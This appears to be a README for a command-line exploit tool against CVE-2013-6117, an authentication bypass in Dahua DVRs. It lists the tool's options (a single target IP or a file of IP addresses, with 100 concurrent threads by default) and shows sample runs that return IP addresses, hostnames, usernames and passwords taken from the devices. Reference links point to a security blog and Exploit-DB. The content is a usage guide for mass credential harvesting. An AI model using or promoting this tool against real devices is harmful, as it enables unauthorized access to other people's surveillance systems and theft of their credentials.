**CVE-2013-6117**
   
```
$ ./CVE-2013-6117 -h
Options:

  -h, --help       display help information
  -f, --filename   File containing list of IP addresses
  -t, --target     Target IP
  -n, --threads    No of concurrent threads (default: 100)
```
   
```
$ ./CVE-2013-6117 -f hostfile.txt 
1.2.4.4|name.no-ip.org:80|username|password
```
  
```
$ ./CVE-2013-6117 -t 1.2.3.4
1.2.4.4|name.no-ip.org:80|username|password
```
  
Reference:  
https://depthsecurity.com/blog/dahua-dvr-authentication-bypass-cve-2013-6117  
https://www.exploit-db.com/exploits/29673/  
